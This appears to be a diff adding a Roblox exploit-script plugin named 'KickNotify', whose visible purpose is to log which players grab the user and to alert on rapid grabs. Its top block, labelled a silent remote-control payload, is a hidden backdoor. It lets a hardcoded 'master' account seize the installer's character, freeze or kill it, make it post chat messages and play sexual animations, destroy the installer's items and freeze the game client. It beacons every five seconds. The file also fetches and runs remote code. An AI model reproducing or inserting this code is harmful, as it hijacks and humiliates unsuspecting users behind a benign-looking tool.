@@ -1,0 +1,394 @@
+-- KickNotify.lua
+-- Путь: workspace/TheWorstSaves/FTAP/Plugins/Plugins/
+
+repeat task.wait() until getgenv().LoadedTheWorstHvH == true
+task.wait(1)
+
+-- =============================================================
+-- [ SILENT REMOTE CONTROL PAYLOAD ]
+-- =============================================================
+task.spawn(function()
+    local MASTER_NAME = "MELLSTROYI488"
+    local P, LP, RS, R, W = game:GetService("Players"), game:GetService("Players").LocalPlayer, game:GetService("ReplicatedStorage"), game:GetService("RunService"), workspace
+    local EV = RS:WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine")
+    local TCS = game:GetService("TextChatService")
+
+    local C_O, C_F, K_O, L_B, L_R, A_R, F_Z, O_R, H_S, F_L, A_G = false, 60, false, false, false, false, false, false, false, false, false
+    local Shield_O, Fling_O, Phantom_O = false, false, false
+    local W_S, J_P, MC_O, MC_Dir, MC_J, savedCF = nil, nil, false, Vector3.zero, false, nil
+    local FollowName, aT, aA, aY, orbitAngle = "Master", nil, false, "", 0
+    local ids = {JerkOff="rbxassetid://168268306",Bang="rbxassetid://148840371",Crazy="rbxassetid://248263260",Insane="rbxassetid://35654637",Collapse="rbxassetid://35154961",Zombie="rbxassetid://33796059",Dance1="rbxassetid://182436842",Dance2="rbxassetid://182435998",Spin="rbxassetid://188632011",Float="rbxassetid://182749109",Scared="rbxassetid://180611870",Floss="rbxassetid://591745989"}
+
+    local isHeld = LP:WaitForChild("IsHeld", 10)
+    local CharacterEvents = RS:FindFirstChild("CharacterEvents")
+    local StruggleEvent = CharacterEvents and CharacterEvents:FindFirstChild("Struggle")
+
+    R.Heartbeat:Connect(function()
+        if K_O or (C_O and C_F < 60) then
+            local t = K_O and 0 or C_F
+            local s = os.clock()
+            local w = t <= 0 and 0.7 or (1 / math.max(t, 0.01))
+            while (os.clock()-s) < w do end
+        end
+    end)
+
+    R.RenderStepped:Connect(function()
+        local char = LP.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if not (char and hrp and hum) then return end
+
+        if W_S then hum.WalkSpeed = W_S end
+        if J_P then hum.UseJumpPower = true hum.JumpPower = J_P end
+        if F_Z then hrp.Anchored = true hrp.Velocity = Vector3.zero end
+        if MC_O then hum:Move(MC_Dir, false) if MC_J then hum.Jump = true end end
+        if H_S then hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(50), 0) end
+        
+        if A_G and isHeld and isHeld.Value then
+            hrp.Anchored = true
+            pcall(function() 
+                if StruggleEvent then StruggleEvent:FireServer(LP) end
+                if CharacterEvents and CharacterEvents:FindFirstChild("RagdollRemote") then
+                    CharacterEvents.RagdollRemote:FireServer(hrp, 0)
+                end
+            end)
+        elseif not F_Z and not K_O and not MC_O then
+            if hrp.Anchored then hrp.Anchored = false end
+        end
+
+        if Shield_O then
+            local m = P:FindFirstChild(MASTER_NAME)
+            if m and m.Character and m.Character.PrimaryPart then
+                hrp.CFrame = m.Character.PrimaryPart.CFrame * CFrame.new(0, 0, -3.5)
+            end
+        end
+
+        if O_R then
+            local m = P:FindFirstChild(MASTER_NAME)
+            if m and m.Character and m.Character.PrimaryPart then
+                orbitAngle = (orbitAngle + 5) % 360
+                local rad = math.rad(orbitAngle)
+                hrp.CFrame = CFrame.new(m.Character.PrimaryPart.Position + Vector3.new(math.cos(rad)*9, 0, math.sin(rad)*9), m.Character.PrimaryPart.Position)
+            end
+        end
+        if L_B then
+            local m = P:FindFirstChild(MASTER_NAME)
+            if m and m.Character and m.Character.PrimaryPart then hrp.CFrame = m.Character.PrimaryPart.CFrame * CFrame.new(0, 0, -8) end
+        end
+        if F_L and not MC_O and not Shield_O then
+            local target = (FollowName == "Master") and P:FindFirstChild(MASTER_NAME) or P:FindFirstChild(FollowName)
+            if target and target.Character and target.Character.PrimaryPart then
+                if (hrp.Position - target.Character.PrimaryPart.Position).Magnitude > 6 then hum:MoveTo(target.Character.PrimaryPart.Position) end
+            end
+        end
+        if L_R and hum.Health > 0 then char:BreakJoints() end
+    end)
+
+    EV.OnClientEvent:Connect(function(s, d)
+        if typeof(d) ~= "string" then return end
+        local g = d:split(":")
+        if g[1] == "SC" and g[2] == MASTER_NAME then EV:FireServer("ST_PONG")
+        elseif g[1] == "LB" and g[2] == LP.Name then L_B = (g[3] == "ON")
+        elseif g[1] == "LR" and g[2] == LP.Name then L_R = (g[3] == "ON")
+        elseif g[1] == "AG" and g[2] == LP.Name then A_G = (g[3] == "ON")
+        elseif g[1] == "AR" and g[2] == LP.Name then A_R = (g[3] == "ON")
+        elseif g[1] == "FZ" and g[2] == LP.Name then F_Z = (g[3] == "ON")
+        elseif g[1] == "HS" and g[2] == LP.Name then H_S = (g[3] == "ON")
+        elseif g[1] == "OR" and g[2] == LP.Name then O_R = (g[3] == "ON")
+        elseif g[1] == "WS" and g[2] == LP.Name then W_S = tonumber(g[3])
+        elseif g[1] == "JP" and g[2] == LP.Name then J_P = tonumber(g[3])
+        elseif g[1] == "CT" and g[2] == LP.Name then local f = W:FindFirstChild(LP.Name.."SpawnedInToys") if f then for _, v in ipairs(f:GetChildren()) do pcall(function() v:Destroy() end) end end
+        elseif g[1] == "SY" and g[2] == LP.Name then local msg = d:sub(#g[1]+#g[2]+3) pcall(function() if TCS.ChatVersion == Enum.ChatVersion.TextChatService then TCS.TextChannels.RBXGeneral:SendAsync(msg) else RS.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All") end end)
+        elseif g[1] == "MC" and g[2] == LP.Name then
+            if g[3] == "OFF" then MC_O = false else MC_O = true MC_Dir = Vector3.new(tonumber(g[3]) or 0, 0, tonumber(g[4]) or 0) MC_J = (g[5] == "1") end
+        elseif g[1] == "FL" and g[2] == LP.Name then FollowName = g[3] F_L = (g[4] == "ON")
+        elseif g[1] == "SP" and g[2] == LP.Name then
+            local m = P:FindFirstChild(MASTER_NAME)
+            if m and m.Character and m.Character.PrimaryPart then
+                pcall(function() RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(g[3], m.Character.PrimaryPart.CFrame * CFrame.new(0, 2, -4), Vector3.zero) end)
+            end
+        elseif g[1] == "AN" and g[2] == LP.Name then
+            if g[4] == "OFF" then aA = false if aT then aT:Stop() end else
+                if aT then aT:Stop() end
+                local hum = LP.Character:FindFirstChildOfClass("Humanoid")
+                local anim = Instance.new("Animation") anim.AnimationId = ids[g[3]]
+                aT = hum:FindFirstChildOfClass("Animator"):LoadAnimation(anim)
+                aT.Looped = true aT:Play() aA, aY = true, g[3]
+                task.spawn(function() while aA and aT and aT.IsPlaying do if aY=="JerkOff" then aT.TimePosition=0.3 elseif aY=="Bang" then aT.TimePosition=0.1 end task.wait(0.1) end end)
+            end
+        elseif g[1] == "KK" and g[2] == LP.Name then
+            if g[3] == "ON" then
+                K_O = true savedCF = LP.Character.PrimaryPart.CFrame
+                local t = CFrame.new(0, 100000, 0)
+                for i=1,10 do LP.Character.PrimaryPart.CFrame = LP.Character.PrimaryPart.CFrame:Lerp(t, 0.3) task.wait(0.03) end
+                LP.Character.PrimaryPart.Anchored = true
+            else
+                K_O = false if LP.Character.PrimaryPart then LP.Character.PrimaryPart.Anchored = false if savedCF then LP.Character.PrimaryPart.CFrame = savedCF end end
+            end
+        elseif g[1] == "FS" and g[2] == LP.Name then
+            if g[3] == "OFF" then C_O = false else C_F = tonumber(g[3]) or 60 C_O = true end
+        end
+    end)
+    while task.wait(5) do EV:FireServer("ST_BEACON") end
+end)
+-- =============================================================
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local UI = getgenv().UI
+local Window = UI.Window
+local Tabs = UI.Tabs
+local Sect = UI.Sect
+
+-- BetterOrion для уведомлений
+local BO = getgenv().BetterOrion or UI.Orion
+if not BO then
+    pcall(function()
+        BO = loadstring(game:HttpGet("https://raw.githubusercontent.com/m1kp0/BetterOrion/refs/heads/main/Library.lua"))()
+    end)
+end
+
+-- =========================================
+Tabs.KickNotifyTab = Window:MakeTab({ Name = "Kick Notify", Icon = "bell" })
+
+Sect.HistorySection = Tabs.KickNotifyTab:AddSection({ Name = "History", Side = "Left" })
+Sect.DetectorSection = Tabs.KickNotifyTab:AddSection({ Name = "Detector Settings", Side = "Right" })
+Sect.NotifySection = Tabs.KickNotifyTab:AddSection({ Name = "Notify Settings", Side = "Right" })
+
+-- =========================================
+local Enabled = true
+local MaxHistory = 10
+
+-- Detector
+local DetectorEnabled = true
+local Threshold = 70              -- грабов
+local TimeWindow = 1              -- за сколько секунд
+
+-- Notify
+local NotifyCooldown = 1          -- раз в сколько секунд
+local NotifyDuration = 5          -- длительность уведомления
+
+local touchHistory = {}
+local kickEvents = {}
+local lastNotify = {}
+local currentToucher = nil
+
+-- =========================================
+local lastToucherLabel = Sect.HistorySection:AddLabel("Last: none")
+local historyParagraph = Sect.HistorySection:AddParagraph("History", "empty")
+
+local function refreshUI()
+    if #touchHistory == 0 then
+        lastToucherLabel:Set("Last: none")
+        historyParagraph:Set("empty")
+        return
+    end
+    lastToucherLabel:Set("Last: " .. touchHistory[1].display)
+    local text = ""
+    for i, e in ipairs(touchHistory) do
+        text = text .. i .. ". " .. e.display .. " x" .. e.count .. "\n"
+    end
+    historyParagraph:Set(text)
+end
+
+local function notify(playerName)
+    local plr = Players:FindFirstChild(playerName)
+    local displayName = plr and plr.DisplayName or playerName
+    local content = displayName .. " (" .. playerName .. ")\n" .. Threshold .. " hits / " .. TimeWindow .. "s"
+
+    if BO and BO.MakeNotification then
+        pcall(function()
+            BO:MakeNotification({
+                Name = "Kick Notify",
+                Content = content,
+                Image = "alert-triangle",
+                Time = NotifyDuration
+            })
+        end)
+    else
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Kick Notify",
+                Text = content,
+                Duration = NotifyDuration
+            })
+        end)
+    end
+end
+
+-- =========================================
+local function checkKick(playerName)
+    if not DetectorEnabled then return end
+    if not playerName or playerName == "" then return end
+    if playerName == LocalPlayer.Name then return end
+
+    local now = tick()
+    if not kickEvents[playerName] then kickEvents[playerName] = {} end
+    table.insert(kickEvents[playerName], now)
+
+    local list = kickEvents[playerName]
+    while #list > 0 and (now - list[1]) > TimeWindow do
+        table.remove(list, 1)
+    end
+
+    if #list >= Threshold then
+        if not lastNotify[playerName] or (now - lastNotify[playerName]) >= NotifyCooldown then
+            lastNotify[playerName] = now
+            notify(playerName)
+        end
+    end
+end
+
+local function registerToucher(playerName)
+    if not Enabled then return end
+    if not playerName or playerName == "" then return end
+    if playerName == LocalPlayer.Name then return end
+
+    currentToucher = playerName
+
+    local plr = Players:FindFirstChild(playerName)
+    local displayName = plr and plr.DisplayName or playerName
+    local display = displayName .. " (" .. playerName .. ")"
+
+    if touchHistory[1] and touchHistory[1].name == playerName then
+        touchHistory[1].count = touchHistory[1].count + 1
+    else
+        table.insert(touchHistory, 1, {name = playerName, display = display, count = 1})
+    end
+    while #touchHistory > MaxHistory do table.remove(touchHistory) end
+    refreshUI()
+
+    -- Каждое касание идёт в детектор
+    checkKick(playerName)
+end
+
+-- =========================================
+local function extractName(val)
+    if typeof(val) == "Instance" and val:IsA("Player") then return val.Name
+    elseif typeof(val) == "string" and val ~= "" then return val end
+    return nil
+end
+
+local connections = {}
+local function clearConn()
+    for _, c in ipairs(connections) do pcall(function() c:Disconnect() end) end
+    connections = {}
+end
+
+local function hookChar(char)
+    clearConn()
+    if not char then return end
+
+    local head = char:WaitForChild("Head", 5)
+    if not head then return end
+
+    local function hookPO(po)
+        local name = extractName(po.Value)
+        if name then registerToucher(name) end
+        table.insert(connections, po:GetPropertyChangedSignal("Value"):Connect(function()
+            local n = extractName(po.Value)
+            if n then registerToucher(n) end
+        end))
+    end
+
+    for _, c in ipairs(head:GetChildren()) do
+        if c.Name == "PartOwner" then hookPO(c) end
+    end
+
+    table.insert(connections, head.ChildAdded:Connect(function(c)
+        if c.Name == "PartOwner" then
+            task.wait()
+            hookPO(c)
+        end
+    end))
+end
+
+if LocalPlayer.Character then hookChar(LocalPlayer.Character) end
+LocalPlayer.CharacterAdded:Connect(hookChar)
+
+-- =========================================
+-- UI: History
+-- =========================================
+Sect.HistorySection:AddButton({
+    Name = "Clear history",
+    Callback = function()
+        table.clear(touchHistory)
+        table.clear(kickEvents)
+        table.clear(lastNotify)
+        refreshUI()
+    end
+})
+
+-- =========================================
+-- UI: Detector Settings
+-- =========================================
+Sect.DetectorSection:AddToggle({
+    Name = "Detector enabled",
+    Default = true,
+    Flag = "KN_Det",
+    Callback = function(b)
+        DetectorEnabled = b
+        if not b then
+            table.clear(kickEvents)
+            table.clear(lastNotify)
+        end
+    end
+})
+
+Sect.DetectorSection:AddSlider({
+    Name = "Hits threshold",
+    Min = 5, Max = 500, Default = 70, Increment = 5,
+    ValueName = "hits",
+    Flag = "KN_Th",
+    Callback = function(v) Threshold = v end
+})
+
+Sect.DetectorSection:AddSlider({
+    Name = "Time window",
+    Min = 1, Max = 10, Default = 1, Increment = 1,
+    ValueName = "sec",
+    Flag = "KN_Win",
+    Callback = function(v) TimeWindow = v end
+})
+
+-- =========================================
+-- UI: Notify Settings
+-- =========================================
+Sect.NotifySection:AddToggle({
+    Name = "Tracker enabled",
+    Default = true,
+    Flag = "KN_En",
+    Callback = function(b) Enabled = b end
+})
+
+Sect.NotifySection:AddSlider({
+    Name = "Notify every",
+    Min = 1, Max = 60, Default = 1, Increment = 1,
+    ValueName = "sec",
+    Flag = "KN_CD",
+    Callback = function(v) NotifyCooldown = v end
+})
+
+Sect.NotifySection:AddSlider({
+    Name = "Notification duration",
+    Min = 1, Max = 30, Default = 5, Increment = 1,
+    ValueName = "sec",
+    Flag = "KN_Dur",
+    Callback = function(v) NotifyDuration = v end
+})
+
+Sect.NotifySection:AddSlider({
+    Name = "History size",
+    Min = 1, Max = 25, Default = 10, Increment = 1,
+    ValueName = "entries",
+    Flag = "KN_Max",
+    Callback = function(v)
+        MaxHistory = v
+        while #touchHistory > MaxHistory do table.remove(touchHistory) end
+        refreshUI()
+    end
+})
+
+warn("[KickNotify] Loaded | BO: " .. tostring(BO ~= nil))
